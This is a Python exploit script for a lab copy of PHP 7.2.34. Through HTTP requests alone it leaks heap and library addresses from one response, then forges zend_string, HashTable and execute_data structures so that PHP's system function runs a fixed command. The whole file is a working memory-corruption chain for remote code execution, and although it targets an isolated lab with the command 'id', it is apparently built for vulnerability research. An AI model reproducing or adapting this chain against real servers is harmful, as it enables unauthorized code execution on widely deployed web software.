#!/usr/bin/env python3
"""PHP 7.2.34 HTTP-only disclosure-to-proof chain for the isolated lab.

All absolute addresses used by the terminal request are parsed from the B1
HTTP response.  The script never reads target process state.  Its only fixed
command is ``id>/out/p``.
"""

from __future__ import annotations

import argparse
import json
import re
import socket
import struct
import sys
import time
from pathlib import Path


HARNESS = Path("/harness")
LAB = Path("/lab")
PROFILE_PATH = LAB / "php-7.2.34-apache-amd64-trans-sid.json"
PRODUCER_PADS = 32
CONSUMER_BOUNDARY_LEN = 10
CONSUMER_VALUE_LEN = 4071
FAKE_PAGE_OFFSET = 0x79000
DONOR_OFFSET = 0x7D098
sys.path.insert(0, str(HARNESS))
sys.path.insert(0, str(LAB))

from exploit import Target  # noqa: E402
from php81_trans_sid import FIXED_COMMAND, Php81TransSidExploit  # noqa: E402
from profile import Profile, ProfileError, parse_hex  # noqa: E402
import sequence72 as terminal  # noqa: E402


class Php72TransSidExploit(Php81TransSidExploit):
    """Use the PHP 7.2 unpersistent-string GC type in the B1 carrier."""

    def _forge_b1_value(self, pages: int, index: int) -> bytes:
        spec = self.recipe["b1"]
        length = pages * self.page_size - int(spec["allocator_overhead"])
        value = bytearray(b"A" * length)
        header = parse_hex(spec["target_offset"], "b1.target_offset") - int(
            spec["value_data_offset"]
        )
        if header < 0 or header + 0x20 > length:
            raise ProfileError("PHP 7.2 B1 fake zend_string is outside its carrier")
        struct.pack_into(
            "<IIQQ",
            value,
            header,
            0,
            0x6,
            0,
            parse_hex(spec["fake_len"], "b1.fake_len"),
        )
        value[header + 0x18:header + 0x20] = self._tag(index)
        return bytes(value)


def status(response: bytes) -> str:
    match = re.match(rb"HTTP/1\.[01] ([0-9]{3})", response)
    return match.group(1).decode("ascii") if match else "eof"


def health() -> dict[str, object]:
    request = (
        b"GET /terminal.php HTTP/1.1\r\n"
        b"Host: php2shell-72-target\r\nConnection: close\r\n\r\n"
    )
    with socket.create_connection(("php2shell-72-target", 80), 10) as sock:
        sock.settimeout(10)
        sock.sendall(request)
        pieces: list[bytes] = []
        while True:
            piece = sock.recv(65536)
            if not piece:
                break
            pieces.append(piece)
    response = b"".join(pieces)
    body = response.partition(b"\r\n\r\n")[2]
    match = re.search(rb"\{[^\r\n]*\}", body)
    if status(response) != "200" or not match:
        raise RuntimeError("terminal health request did not return JSON")
    return json.loads(match.group(0))


def terminal_b(boundary_len: int, value_len: int) -> bytes:
    return terminal.fileless_consumer(
        count=638,
        value_len=value_len,
        bump_count=6,
        bump_len=5000,
        extra2_count=255,
        extra2_len=8000,
        extra_count=98,
        extra_len=12000,
        nested_depth=0,
        tail_len=1,
        tail_name_len=32,
        tail_nested_depth=0,
        cookie_pairs=33,
        cookie_len=31,
        cookie_extra_name_len=0,
        cookie_extra_value_len=0,
        pre_fields=0,
        pre_field_name_len=7,
        pre_field_value_len=1,
        pre_field_nested_depth=0,
        pre_files=0,
        pre_file_name_len=7,
        pre_filename_len=7,
        pre_file_data_len=1,
        progress_value_len=31,
        sid_len=31,
        fill=b"C",
        boundary_len=boundary_len,
    )


def terminal_c(
    main_chunk: int,
    zif_system: int,
    fake_page_offset: int,
    donor_offset: int,
) -> bytes:
    page = main_chunk + fake_page_offset
    donor = main_chunk + donor_offset

    outer = struct.pack("<IIQII", 1, 0xA, page + 0x38, 0x1407, 0)
    fake_prefix = struct.pack("<IIIIQ", 1, 0x8007, 0x10, 0, donor)
    first_full = outer + b"P" * 8 + fake_prefix
    if len(first_full) != 56 or first_full[-1] != 0:
        raise RuntimeError("fake HashTable carrier lost its implicit-NUL layout")

    pdestructor = struct.pack("<Q", zif_system) + b"E" * 47
    command = FIXED_COMMAND
    execute_data = bytearray(96)
    struct.pack_into("<I", execute_data, 8, 6)
    struct.pack_into("<Q", execute_data, 0x10, len(command))
    execute_data[0x18:0x18 + len(command) + 1] = command + b"\x00"
    struct.pack_into("<I", execute_data, 0x2C, 1)
    struct.pack_into("<Q", execute_data, 0x50, donor)
    struct.pack_into("<I", execute_data, 0x58, 6)

    duplicate = b"q0000".ljust(7, b"Q")
    headers = [(b"Z" * 19, b"")]
    headers.extend((b"X" * 19, b"V") for _ in range(49))
    return terminal.fileless_consumer(
        count=0,
        value_len=0,
        bump_count=0,
        bump_len=0,
        extra2_count=0,
        extra2_len=0,
        extra_count=0,
        extra_len=0,
        nested_depth=0,
        tail_len=0,
        tail_name_len=4,
        tail_nested_depth=0,
        cookie_pairs=0,
        cookie_len=31,
        cookie_extra_name_len=0,
        cookie_extra_value_len=0,
        pre_fields=4,
        pre_field_name_len=7,
        pre_field_value_len=1,
        pre_field_nested_depth=0,
        pre_files=0,
        pre_file_name_len=7,
        pre_filename_len=7,
        pre_file_data_len=1,
        progress_value_len=3,
        sid_len=31,
        fill=b"D",
        sid_pre_headers=headers,
        pre_field_values=[
            b"A" * 55,
            pdestructor,
            first_full[:-1],
            bytes(execute_data),
        ],
        pre_field_names=[
            duplicate,
            duplicate,
            b"q0001".ljust(7, b"Q"),
            b"q0002".ljust(7, b"Q"),
        ],
    )


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--label", required=True)
    parser.add_argument("--pause-after-disclosure", action="store_true")
    args = parser.parse_args()
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", args.label):
        raise SystemExit("invalid label")

    out = Path("/results") / ("full-" + args.label)
    out.mkdir(parents=True, exist_ok=False)
    raw = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
    profile = Profile(PROFILE_PATH, raw, raw["id"])
    target = Target("http://target/index.php", [socket.gethostbyname("target")], timeout=30.0)
    engine = Php72TransSidExploit(target, profile, FIXED_COMMAND)
    terminal.HOST = "php2shell-72-target"
    terminal.ENDPOINT = "/index.php"

    stages: dict[str, object] = {"address_source": "HTTP B1 response only"}
    health_records = [health()]

    body, boundary, query = engine.build_a1()
    response = target.post_chunked(body, boundary, query=query, read_cap=1 << 20, timeout=180.0)
    (out / "a1.response").write_bytes(response)
    stages["a1"] = {"status": status(response), "response_length": len(response)}
    del body, response

    # A1 deliberately leaves a stale process-global session pointer for B1.
    # No intervening request may run here.
    body, boundary, query = engine.build_b1()
    response = target.post_chunked(body, boundary, query=query, read_cap=20 << 20, timeout=600.0)
    (out / "b1.response").write_bytes(response)
    leak = engine.extract_b1_leak(response)
    disclosure = engine.parse_b1_leak(leak)
    (out / "b1.leak").write_bytes(leak)
    stages["b1"] = {
        "status": status(response),
        "response_length": len(response),
        "leak_length": len(leak),
        "main_chunk": hex(disclosure.main_chunk),
        "libphp_base": hex(disclosure.libphp_base),
        "zval_ptr_dtor": hex(disclosure.zval_ptr_dtor),
        "dtor_hits": disclosure.dtor_hits,
    }
    del body, response, leak
    # B1 has consumed the stale pointer, so a health request is safe again.
    health_records.append(health())
    pids = [int(record["pid"]) for record in health_records]
    if len(set(pids)) != 1:
        raise RuntimeError(f"worker changed during disclosure stages: {pids}")
    expected = {
        "memory_limit": "12M",
        "post_max_size": "64M",
        "upload_max_filesize": "64M",
        "display_errors": "0",
        "log_errors": "0",
        "error_reporting": 0,
        "session_use_cookies": "1",
        "session_use_only_cookies": "1",
        "session_use_trans_sid": "0",
    }
    for key, value in expected.items():
        if health_records[-1].get(key) != value:
            raise RuntimeError(
                f"terminal config mismatch for {key}: "
                f"{health_records[-1].get(key)!r} != {value!r}"
            )
    stages["health"] = health_records

    if args.pause_after_disclosure:
        (out / "disclosure.ready").write_text("ready\n", encoding="ascii")
        deadline = time.monotonic() + 180.0
        while not (out / "continue").exists():
            if time.monotonic() >= deadline:
                raise TimeoutError("timed out waiting for local trace attachment")
            time.sleep(0.05)

    stages["terminal_producer_pads"] = PRODUCER_PADS
    stages["terminal_consumer_boundary_len"] = CONSUMER_BOUNDARY_LEN
    stages["terminal_consumer_value_len"] = CONSUMER_VALUE_LEN
    response = terminal.producer(PRODUCER_PADS)
    stages["terminal_a"] = {"status": status(response), "response_length": len(response)}
    del response
    time.sleep(0.25)
    response = terminal_b(CONSUMER_BOUNDARY_LEN, CONSUMER_VALUE_LEN)
    stages["terminal_b"] = {"status": status(response), "response_length": len(response)}
    del response
    time.sleep(0.25)

    zif_system = disclosure.libphp_base + 0x3624E0
    stages["terminal_addresses"] = {
        "source": "parsed HTTP B1 response",
        "main_chunk": hex(disclosure.main_chunk),
        "fake_page": hex(disclosure.main_chunk + FAKE_PAGE_OFFSET),
        "donor": hex(disclosure.main_chunk + DONOR_OFFSET),
        "zif_system": hex(zif_system),
    }
    response = terminal_c(
        disclosure.main_chunk,
        zif_system,
        FAKE_PAGE_OFFSET,
        DONOR_OFFSET,
    )
    stages["terminal_c"] = {"status": status(response), "response_length": len(response)}
    (out / "summary.json").write_text(json.dumps(stages, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(stages, sort_keys=True), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
